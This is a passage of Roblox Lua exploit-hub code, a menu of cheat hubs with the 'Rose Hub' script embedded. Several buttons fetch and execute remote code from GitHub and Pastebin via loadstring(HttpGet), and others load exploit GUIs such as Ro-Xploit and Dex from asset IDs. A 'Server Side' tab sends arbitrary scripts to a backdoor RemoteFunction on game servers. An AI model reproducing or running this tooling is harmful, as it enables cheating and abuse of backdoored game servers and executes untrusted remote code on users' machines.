TextLabel_2.Size = UDim2.new(0, 69, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "v.1"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 14.000

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.Position = UDim2.new(0.278901875, 0, 0.21836251, 0)
TextLabel_3.Size = UDim2.new(0, 194, 0, 37)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "only hubs rn scripts soon"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000
end)

Section:NewButton("Gabx Hub", "Old But Gold", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
end)

Section:NewButton("RoseHubV3.0.5", "Months old but Op as hell", function()
local start = tick()
print("Rose Hub process started.")
local VERSION = "3.0.5"
local delete = {"Rose Hub 3.0.0", "Introooo", "ColorPick"}
local tweening = false
local scriptsTabText = ""
local guiTabText = ""
local darkBack = false
local lightBack = true
local tweenService = game:GetService("TweenService")
local tweenSpeed = 0.70
local colorPickerOpen = false
local backColor = Color3.fromRGB(255, 255, 255)
local lightColor = Color3.fromRGB(255, 255, 255)
local darkColor = Color3.fromRGB(150, 150, 150)
local textColor = Color3.fromRGB(255, 255, 255)
local httpService = game:GetService("HttpService")
local savingSettings = false
local mainSettings = nil
local lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")
local chat = game:GetService("Chat")

--Delete old GUI
function FindTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end end
	return false
 end
  
 for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
	if v:IsA("ScreenGui") then
	if FindTable(delete, v.Name) then
		v:Destroy()
	end
 end
 end

--Create Frames
local screenGui = game:GetObjects("rbxassetid://3410845588")[1]
screenGui.Parent = game:GetService("CoreGui")
screenGui.Enabled = false
screenGui.Main.Top:FindFirstChildOfClass("TextLabel").Text = "Rose Hub "..VERSION

local colourpicker = game:GetObjects("rbxassetid://3444232310")[1]
colourpicker.Parent = game:GetService("CoreGui")
colourpicker.Enabled = false    

local intro = game:GetObjects("rbxassetid://3394996507")[1]
intro.Parent = game:GetService("CoreGui")

local function round(num)
    return math.floor(num * 10^3 + 0.5) / 10^3
end

local function createFrame(Active, BackgroundColor3, BackgroundTransparency, BorderSizePixel, ClipsDescendants, Name, Parent, Position, Size)
    local Frame = Instance.new("Frame")
    Frame.Active = Active
    Frame.BackgroundColor3 = BackgroundColor3
    Frame.BackgroundTransparency = BackgroundTransparency
    Frame.BorderSizePixel = BorderSizePixel
    Frame.ClipsDescendants = ClipsDescendants
    Frame.Name = Name
    Frame.Parent = Parent
    Frame.Position = Position
    Frame.Size = Size
    return Frame
end

local function createTextLabel(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment, ZIndex)
    local TextLabel = Instance.new("TextLabel")
    TextLabel.BackgroundColor3 = BackgroundColor3
    TextLabel.BackgroundTransparency = BackgroundTransparency
    TextLabel.BorderSizePixel = BorderSizePixel
    TextLabel.Font = Font
    TextLabel.Name = Name
    TextLabel.Parent = Parent
    TextLabel.Position = Position
    TextLabel.Size = Size
    TextLabel.Text = Text
    TextLabel.TextColor3 = TextColor3
    TextLabel.TextSize = TextSize
    TextLabel.TextWrapped = TextWrapped
    TextLabel.TextXAlignment = TextXAlignment
    TextLabel.TextYAlignment = TextYAlignment
    TextLabel.ZIndex = ZIndex
    return TextLabel
end

local function createTextBox(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, PlaceholderText, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment)
    local TextBox = Instance.new("TextBox")
    TextBox.BackgroundColor3 = BackgroundColor3
    TextBox.BackgroundTransparency = BackgroundTransparency
    TextBox.BorderSizePixel = BorderSizePixel
    TextBox.Font = Font
    TextBox.Name = Name
    TextBox.Parent = Parent
    TextBox.PlaceholderText = PlaceholderText
    TextBox.Position = Position
    TextBox.Size = Size
    TextBox.Text = Text
    TextBox.TextColor3 = TextColor3
    TextBox.TextSize = TextSize
    TextBox.TextWrapped = TextWrapped
    TextBox.TextXAlignment = TextXAlignment
    TextBox.TextYAlignment = TextYAlignment
    return TextBox
end

local function createTextButton(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, ZIndex, func)
    local TextButton = Instance.new("TextButton")
    TextButton.BackgroundColor3 = BackgroundColor3
    TextButton.BackgroundTransparency = BackgroundTransparency
    TextButton.BorderSizePixel = BorderSizePixel
    TextButton.Font = Font
    TextButton.Name = Name
    TextButton.Parent = Parent
    TextButton.Position = Position
    TextButton.Size = Size
    TextButton.Text = Text
    TextButton.TextColor3 = TextColor3
    TextButton.TextSize = TextSize
    TextButton.ZIndex = ZIndex
    TextButton.MouseButton1Up:Connect(func)
    return TextButton
end

local function createImageLabel(BackgroundTransparency, Image, Name, Parent, Position, Selectable, Size, ZIndex)
    local ImageLabel = Instance.new("ImageLabel")
    ImageLabel.BackgroundTransparency = BackgroundTransparency
    ImageLabel.Image = Image
    ImageLabel.Name = Name
    ImageLabel.Parent = Parent
    ImageLabel.Position = Position
    ImageLabel.Selectable = Selectable
    ImageLabel.Size = Size
    ImageLabel.ZIndex = ZIndex
    return ImageLabel
end

local function createScrollingFrame(BackgroundColor3, BackgroundTransparency, BorderSizePixel, BottomImage, CanvasSize, MidImage, Name, Parent, Position, Rotation, ScrollBarThickness, Selectable, Size, TopImage, Visible)
    local ScrollingFrame = Instance.new("ScrollingFrame")
    ScrollingFrame.BackgroundColor3 = BackgroundColor3
    ScrollingFrame.BackgroundTransparency = BackgroundTransparency
    ScrollingFrame.BorderSizePixel = BorderSizePixel
    ScrollingFrame.BottomImage = BottomImage
    ScrollingFrame.CanvasSize = CanvasSize
    ScrollingFrame.MidImage = MidImage
    ScrollingFrame.Name = Name
    ScrollingFrame.Parent = Parent
    ScrollingFrame.Position = Position
    ScrollingFrame.Rotation = Rotation
    ScrollingFrame.ScrollBarThickness = ScrollBarThickness
    ScrollingFrame.Selectable = Selectable
    ScrollingFrame.Size = Size
    ScrollingFrame.TopImage = TopImage
    ScrollingFrame.Visible = Visible
    return ScrollingFrame
end

local defaultSettings = {
	["BackgroundColorR"] = 59,
	["BackgroundColorG"] = 59,
	["BackgroundColorB"] = 59,
	["PickerColorR"] = 59,
	["PickerColorG"] = 59,
	["PickerColorB"] = 59,
	["ChangePickerBackground"] = true,
	["Transparency"] = 0.7,
	["RainbowOn"] = false,
	["RainbowSpeed"] = 75,
 }

 local function round(num)
	return math.floor(num *10^3 + 0.5) / 10^3
 end

 if writefile and readfile and pcall(function() readfile("RoseHubSettings.txt") end) then
	local file = readfile("RoseHubSettings.txt")
	local letsgo = true
	local write = false
	if pcall(function() httpService:JSONDecode(file) end) then
		file = httpService:JSONDecode(readfile("RoseHubSettings.txt"))
		mainSettings = file
	else
		mainSettings = defaultSettings
		writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
		warn("Settings file corrupted, creating new.")
		letsgo = false
	end
	if letsgo then
		for setting,value in pairs(defaultSettings) do
			if file[setting] == nil then
				writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
				warn(setting.." is missing, setting to default.")
				file[setting] = defaultSettings[setting]
				write = true
			elseif file[setting] ~= nil then
				if type(file[setting]) ~= type(defaultSettings[setting]) then
					warn(setting.." is invalid, overwriting.")
					write = true
					file[setting] = defaultSettings[setting]
				end
			end
		end
		if write == true then
			warn("Fixing settings file.")
			mainSettings = file
			writefile("RoseHubSettings.txt", httpService:JSONEncode(mainSettings))
			write = false
		end
	end
 else
	mainSettings = defaultSettings
	if writefile then
		warn("Rose Hub settings missing, creating new.")
		writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
	end
 end
  
 local savedColor = Color3.fromRGB(mainSettings.BackgroundColorR, mainSettings.BackgroundColorG, mainSettings.BackgroundColorB)
 local mainTransparency = mainSettings.Transparency
 local enableRainbow = mainSettings.RainbowOn
 local rainbowCount = mainSettings.RainbowSpeed
 local mainTrans = mainSettings.Transparency
 local changeColorPickerBack = mainSettings.ChangePickerBackground
 local colorPickerBack = Color3.fromRGB(mainSettings.PickerColorR, mainSettings.PickerColorG, mainSettings.PickerColorB)
  
 local function saveSetting(backColor, pickerColor, changeBack, tranparency, rainbowOn, rainbowSpeed)
	local settingsTab = {
		["BackgroundColorR"] = round(backColor.r*255),
		["BackgroundColorG"] = round(backColor.g*255),
		["BackgroundColorB"] = round(backColor.b*255),
		["PickerColorR"] = round(pickerColor.r*255),
		["PickerColorG"] = round(pickerColor.g*255),
		["PickerColorB"] = round(pickerColor.b*255),
		["ChangePickerBackground"] = changeBack,
		["Transparency"] = round(tranparency),
		["RainbowOn"] = rainbowOn,
		["RainbowSpeed"] = rainbowSpeed,
	}
	writefile("RoseHubSettings.txt", httpService:JSONEncode(settingsTab))
 end
  
 if darkBack then
	backColor = Color3.fromRGB(150, 150, 150)
 end

local scripttabList = {
    {"VSimFucker", "dtHywXGM", 1},

}

local modulestabList = {
    {"Work In progress", 0, 2}
	--{"Modules GUI", 03107712466, 2},
}

local guistabList = {
	{"Ro-Xploit 4.0", 175137115, 2},
	{"Ro-Xploit 5.0", 288646117, 2},
	{"Ro-Xploit 6.0", 364364477, 2},
	{"Dex 2.0", 492005721, 2},
	{"Dex 3.0", 418957341, 2},
	{"YourMom GUI", 289110135, 2},
	{"Pepe GUI", 277881926, 2},
	{"Vesprin FE GUI", 1231351616, 2},
 }

 local mapstabList = {
	{"Town Map", 1345094164, 2},
	{"Night Club", 1281063730, 2},
 }

 local lists = {
	{scripttabList, "Scripts"},
	{modulestabList, "Modules"},
	{guistabList, "GUIs"},
    {mapstabList, "Maps"},
 }

 local tabs = {
    "Home",
    "Scripts",
    "Modules",
    "Purchased Scripts",
    "GUIs",
    "Executor",
    "Server Side",
    "Maps",
    "Audios",
    "Economy",
    "Settings",
    "Credits",
}
 
function CreateInstance(cls,props)
    local inst = Instance.new(cls)
    for i,v in pairs(props) do
        inst[i] = v
    end
    return inst
end

--Copy Discord Invite
screenGui.Main.Top.Important.HomeTab.Discord.MouseButton1Up:Connect(function()
local copy = true
if pcall(function() Synapse:Copy("http://discord.io/rosehub") end) then
	
else
	local copy2 = setclipboard or Clipboard.set
	copy2("http://discord.io/rosehub")

end

screenGui.Main.Top.Important.HomeTab.Discord.Text = "Copied!"
wait(2)
screenGui.Main.Top.Important.HomeTab.Discord.Text = "Discord Server:\nhttps://discord.io/rosehub"
end)

--[[All Script Tabs,
Sort lists and insert them--]]
for _,list in pairs(lists) do
    local toSort = {}
    local sortedList = {}
    local pos = 0
    
    for _,v in pairs(list[1]) do
        table.insert(toSort, v[1])
    end
    
    table.sort(toSort)
    
    for i,name in pairs(toSort) do
        for i,actualTable in pairs(list[1]) do
            if name == actualTable[1] then
                table.insert(sortedList, {actualTable[1], actualTable[2], actualTable[3]})
            end
        end
    end
    
    --Function to create the buttons
    local function createButons(text)
        pos = 5
        for _,button in pairs(sortedList) do
            if text == "" or string.match(string.lower(button[1]), string.lower(text)) then
                createTextButton(backColor, mainTrans, 0, Enum.Font.SourceSans, button[1], screenGui.Main.Top.Important[list[2].."Tab"].Holder, UDim2.new(0, 5, 0, pos), UDim2.new(0, 181, 0, 20), button[1], textColor, 14, 1, function()
                    if button[3] == 1 then
                        loadstring(game:HttpGet("https://pastebin.com/raw/"..button[2], true))()
                    elseif button[3] == 2 then
                        loadstring(game:GetObjects("rbxassetid://"..button[2])[1].Source)()
                    end
                end)
                pos = pos + 23
            end
        end
    end
    
    --Remove Buttons and create new on search
    local function removeButtons()
        for _,button in pairs(screenGui.Main.Top.Important[list[2].."Tab"].Holder:GetChildren()) do
            button:Destroy()
        end
    end
    
    --Search Function
    screenGui.Main.Top.Important[list[2].."Tab"].Search.PlaceholderColor3 = textColor
    screenGui.Main.Top.Important[list[2].."Tab"].Search.PlaceholderText = "Search "..list[2]
    local function searchBar(chosenList)	
        local search = screenGui.Main.Top.Important[chosenList.."Tab"].Search
        local currentSearch = ""
        search.Changed:connect(function(property)
            if property == "Text" then
                if search.Text ~= "" and search.Text ~= currentSearch then
                    currentSearch = search.Text
                    removeButtons()
                    createButons(search.Text)
                elseif search.Text == "" and currentSearch.Text ~= "" then
                    currentSearch = search.Text
                    removeButtons()
                    createButons("")
                end
            end
        end)
    end	
    
    searchBar(list[2])
    
    --Create Buttons with no search
    createButons("")
    
    screenGui.Main.Top.Important[list[2].."Tab"].Holder.CanvasSize = UDim2.new(1, 0, 0, pos + 2)
end

--Tab Changer
local underline = screenGui.Main.Top.SelectedTab
local tabs = screenGui.Main.Top.Tabs:GetChildren()
local LastTab = tabs[1]
local tweening = false
local OrigSize = underline.Size
local tabPos = 0
local tweenPos = tabPos + 20
local oldTab = screenGui.Main.Top.Tabs.Home

for _,tab in next, tabs do
	if tab:IsA("TextButton") then
		local tweenPos = tabPos + 22
		tab.MouseButton1Up:Connect(function()
			if tweening == false and tab ~= oldTab then
				tweening = true
				underline:TweenSizeAndPosition(UDim2.new(0, 2, 0, 0), UDim2.new(0.5, 0, underline.Position.Y.Scale, underline.Position.Y.Offset), "Out", "Quad", tweenSpeed)
				local newUnderline = createFrame(false, backColor, 0, 0, false, "Frame", screenGui.Main.Top.Tabs, UDim2.new(0.5, 0, 1, -3), UDim2.new(0, 0, 0, 2))
				newUnderline:TweenSize(UDim2.new(0, tab.TextBounds.X, 0, 2), --[[UDim2.new(0, 55 - tab.TextBounds.X/2, 0, tweenPos),]] "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.Important[tostring(oldTab).."Tab"]:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.Important[tostring(tab).."Tab"]:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.CurrentTab:TweenSize(UDim2.new(0, 0, 0, 31), "Out", "Quad", tweenSpeed/2)
                newUnderline.LayoutOrder = tab.LayoutOrder
                newUnderline.AnchorPoint = Vector2.new(0.5, 1)
                newUnderline.Parent = tab
                wait(tweenSpeed/2)
				screenGui.Main.Top.CurrentTab.Label.Text = tab.Name
				screenGui.Main.Top.CurrentTab:TweenSize(UDim2.new(0, 109, 0, 31), "Out", "Quad", tweenSpeed/2)
                wait(tweenSpeed/2)
				screenGui.Main.Top.Important[tostring(oldTab).."Tab"].Position = UDim2.new(-1, 0, 0, 0)
				underline:Destroy()
				underline = newUnderline
				oldTab = tab
				tweening = false
			end
		end)
		tabPos = tabPos + 26
	end
end

--Server Side
screenGui.Serverside.Active = true
screenGui.Serverside.Draggable = true

--Execute
screenGui.Main.Top.Important.ServerSideTab.ExecuteButton.MouseButton1Up:Connect(function()
    local e = game:GetService("JointsService")
    local rem = e.RemoteFunction
    assert(rem, "Remote is missing.")
    rem:InvokeServer(true, screenGui.Main.Top.Important.ServerSideTab.KeyInput.Text, screenGui.Main.Top.Important.ServerSideTab.ScriptHolder.ScriptInput.Text, {})
end)

--Clear Serverside Input
screenGui.Main.Top.Important.ServerSideTab.ClearButton.MouseButton1Up:Connect(function()
	screenGui.Main.Top.Important.ServerSideTab.ScriptHolder.ScriptInput.Text = ""
end)

-- Temp Toggle Script Editor
screenGui.Main.Top.Important.ServerSideTab.settings.MouseButton1Up:Connect(function()
	screenGui.Serverside.Visible = true
end)

--Execute In Script Editor
screenGui.Serverside.execute.MouseButton1Up:Connect(function()
    local e = game:GetService("JointsService")
    local rem = e.RemoteFunction
    assert(rem, "Remote is missing.")
    rem:InvokeServer(true, screenGui.Main.Top.Important.ServerSideTab.KeyInput.Text, screenGui.Serverside.scriptinput.Text, {})
end)

--Clear In Script Editor
screenGui.Serverside.clear.MouseButton1Up:Connect(function()
	screenGui.Serverside.scriptinput.Text = ""
end)

--Close Script Editor
screenGui.Serverside.close.MouseButton1Up:Connect(function()
    screenGui.Serverside.Visible = false
end)


--Executor
--Execute Button
screenGui.Main.Top.Important.ExecutorTab.execute.MouseButton1Up:Connect(function()
    loadstring(screenGui.Main.Top.Important.ExecutorTab.Holder.input.Text)
end)

--Clear Button
screenGui.Main.Top.Important.ExecutorTab.clear.MouseButton1Up:Connect(function()
    screenGui.Main.Top.Important.ExecutorTab.Holder.input.Text = ""
end)

--Audios Tab
local volume = 1
local audioPage = 1

local function stopSounds()
    for _,obj in pairs(lighting:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end
    
    for i,v in pairs(chat:GetChildren()) do
        if v:IsA("Sound") then
            v:Destroy()
        end
    end

    for _,obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end
end

local function playSong(id)
    stopSounds()
    local sound = Instance.new("Sound")
    sound.Parent = lighting
    sound.SoundId = "rbxassetid://"..tostring(id)
    sound.Volume = volume
    sound.Name = "RoseHubSound"
    sound.Looped = true
    sound.Playing = true
end

local audioHolder = screenGui.Main.Top.Important.AudiosTab.Holder
local audioInputBox = screenGui.Main.Top.Important.AudiosTab.audioinput
audioInputBox.PlaceholderColor3 = textColor

screenGui.Main.Top.Important.AudiosTab.Stop.MouseButton1Up:Connect(function()
    stopSounds()
end)

local volumeBox = screenGui.Main.Top.Important.AudiosTab.VolumeBox

screenGui.Main.Top.Important.AudiosTab.Set.MouseButton1Up:Connect(function()
    if tonumber(volumeBox.Text) then
        volume =  tonumber(volumeBox.Text)
        pcall(function()
            lighting.RoseHubSound.Volume = volume
        end)
    end
end)

local currentSong = screenGui.Main.Top.Important.AudiosTab.CurrentSong

screenGui.Main.Top.Important.AudiosTab.PreviousPage.MouseButton1Up:Connect(function()
    if audioPage > 1 then
        audioPage = audioPage - 1
    createAudios(audioPage)
    end
end)

screenGui.Main.Top.Important.AudiosTab.NextPage.MouseButton1Up:Connect(function()
    audioPage = audioPage + 1
    createAudios(audioPage)
end)

function createAudios(audioPage)
    local audioKeyword = audioInputBox.Text
    --local json = "https://search.roblox.com/catalog/jsonCategory=Audio&Keyword="..audioKeyword.."&ResultsPerPage=25&PageNumber="..tostring(audioPage)
    local json = "https://search.roblox.com/catalog/contentsCatalogContext=&Keyword="..audioKeyword.."&SortAggregation=5&LegendExpanded=true&Category=9&ResultsPerPage=25&PageNumber="..tostring(audioPage)
    local gotJson = game:HttpGet(json, true)
    local rawResult = httpService:JSONDecode(gotJson)
    local pos = 5
    for _,button in pairs(audioHolder:GetChildren()) do
        button:Destroy()
    end
    for _,tab in pairs(rawResult) do
        local scale = false
        local button = createTextButton(backColor, mainTrans, 0, Enum.Font.SourceSans, tab.Name, screenGui.Top.Important.AudiosTab.Holder, UDim2.new(0, 5, 0, pos), UDim2.new(0, 181, 0, 20), tab.Name, textColor, 14, 1, function()
            playSong(tab.AssetId)
            currentSong.Text = tab.Name
            currentSong.TextScaled = scale
        end)
        if button.TextBounds.X > button.Size.X.Offset then
            button.TextScaled = true
            scale = true
        end
        pos = pos + 23
    end
    audioHolder.CanvasSize = UDim2.new(0, 0, 0, pos + 2)
end

screenGui.Main.Top.Important.AudiosTab.search.MouseButton1Up:Connect(function()
    createAudios(1)
end)

--Remove pcall
pcall(function()
    createAudios(1)
end)

--[[local ColorPicker = {}

ColorPicker.new = function()
    pickerCreated = true
    local newMt = setmetatable({},{})
    
    local rootGui = colourpicker
    rootGui.Parent = coreGui
    rootGui.Enabled = true
    pickerGui = rootGui.ColorPicker
    local pickerTopBar = pickerGui.TopBar
    backDrop = pickerGui.Backdrop
    local pickerFrame = pickerGui.Backdrop.Content
    local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
    local colorStrip = pickerFrame.ColorStrip
    local previewFrame = pickerFrame.Preview
    local basicColorsFrame = pickerFrame.BasicColors
    local customColorsFrame = pickerFrame.CustomColors
    local okButton = pickerFrame.Ok
    local cancelButton = pickerFrame.Cancel
    local closeButton = pickerTopBar.Close
    local colorScope = colorSpace.Scope
    local colorArrow = pickerFrame.ArrowFrame.Arrow
    local hueInput = pickerFrame.Hue.Input
    local satInput = pickerFrame.Sat.Input
    local valInput = pickerFrame.Val.Input
    local redInput = pickerFrame.Red.Input
    local greenInput = pickerFrame.Green.Input
    local blueInput = pickerFrame.Blue.Input
    local user = game:GetService("UserInputService")
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    
    local hue,sat,val = Color3.toHSV(savedColor)
    local red,green,blue = savedColor.r, savedColor.g, savedColor.b
    local chosenColor = savedColor
    local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
    local customColors = {}
    local function updateColor(noupdate)
        local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
        local hsvColor = Color3.fromHSV(hue,sat,val)

        if noupdate == 2 or not noupdate then
            hueInput.Text = tostring(math.ceil(359*hue))
            satInput.Text = tostring(math.ceil(255*sat))
            valInput.Text = tostring(math.floor(255*val))
        end
        if noupdate == 1 or not noupdate then
            redInput.Text = tostring(math.floor(255*red))
            greenInput.Text = tostring(math.floor(255*green))
            blueInput.Text = tostring(math.floor(255*blue))
        end

        chosenColor = Color3.new(red,green,blue)

        colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
        colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
        colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
        previewFrame.BackgroundColor3 = chosenColor

        updateBack(chosenColor, backDrop)
        
        newMt.Color = chosenColor
        if newMt.Changed then 
            newMt:Changed(chosenColor)
        end
    end
    local function colorSpaceInput()
        local relativeX = mouse.X - colorSpace.AbsolutePosition.X
        local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
            
        if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
        if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
            
        hue = (219 - relativeX)/219
        sat = (199 - relativeY)/199

        local hsvColor = Color3.fromHSV(hue,sat,val)
        red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

        updateColor()
    end
    local function colorStripInput()
        local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

        if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

        val = (199 - relativeY)/199

        local hsvColor = Color3.fromHSV(hue,sat,val)
        red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

        updateColor()
    end
    local function hookButtons(frame,func)
        frame.ArrowFrame.Up.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Up.BackgroundTransparency = 0.5
            elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
                local releaseEvent,runEvent
        
                local startTime = tick()
                local pressing = true
                local startNum = tonumber(frame.Text)
        
                if not startNum then return end
        
                releaseEvent = user.InputEnded:Connect(function(input)
                    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                    releaseEvent:Disconnect()
                    pressing = false
                end)
        
                startNum = startNum + 1
                func(startNum)
                while pressing do
                    if tick()-startTime > 0.3 then
                        startNum = startNum + 1
                        func(startNum)
                    end
                    wait(0.1)
                end
            end
        end)

        frame.ArrowFrame.Up.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Up.BackgroundTransparency = 1
            end
        end)

        frame.ArrowFrame.Down.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Down.BackgroundTransparency = 0.5
            elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
                local releaseEvent,runEvent
        
                local startTime = tick()
                local pressing = true
                local startNum = tonumber(frame.Text)
        
                if not startNum then return end
        
                releaseEvent = user.InputEnded:Connect(function(input)
                    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                    releaseEvent:Disconnect()
                    pressing = false
                end)
        
                startNum = startNum - 1
                func(startNum)
                while pressing do
                    if tick()-startTime > 0.3 then
                        startNum = startNum - 1
                        func(startNum)
                    end
                    wait(0.1)
                end
            end
        end)

        frame.ArrowFrame.Down.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Down.BackgroundTransparency = 1
            end
        end)
    end
    colorSpace.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
    
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
    
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    colorSpaceInput()
                end
            end)
    
            colorSpaceInput()
        end
    end)
    colorStrip.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
    
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
    
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    colorStripInput()
                end
            end)
    
            colorStripInput()
        end
    end)
    local function updateHue(str)
        local num = tonumber(str)
        if num then
            hue = math.clamp(math.floor(num),0,359)/359
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            hueInput.Text = tostring(hue*359)
            updateColor(1)
        end
    end
    hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
    local function updateSat(str)
        local num = tonumber(str)
        if num then
            sat = math.clamp(math.floor(num),0,255)/255
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            satInput.Text = tostring(sat*255)
            updateColor(1)
        end
    end
    satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
    local function updateVal(str)
        local num = tonumber(str)
        if num then
            val = math.clamp(math.floor(num),0,255)/255
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            valInput.Text = tostring(val*255)
            updateColor(1)
        end
    end
    valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
    
    local function updateRed(str)
        local num = tonumber(str)
        if num then
            red = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            redInput.Text = tostring(red*255)
            updateColor(2)
        end
    end
    redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
    
    local function updateGreen(str)
        local num = tonumber(str)
        if num then
            green = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            greenInput.Text = tostring(green*255)
            updateColor(2)
        end
    end
    greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
    
    local function updateBlue(str)
        local num = tonumber(str)
        if num then
            blue = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            blueInput.Text = tostring(blue*255)
            updateColor(2)
        end
    end
    blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
    
    local colorChoice = Instance.new("TextButton")
    colorChoice.Name = "Choice"
    colorChoice.Size = UDim2.new(0,25,0,18)
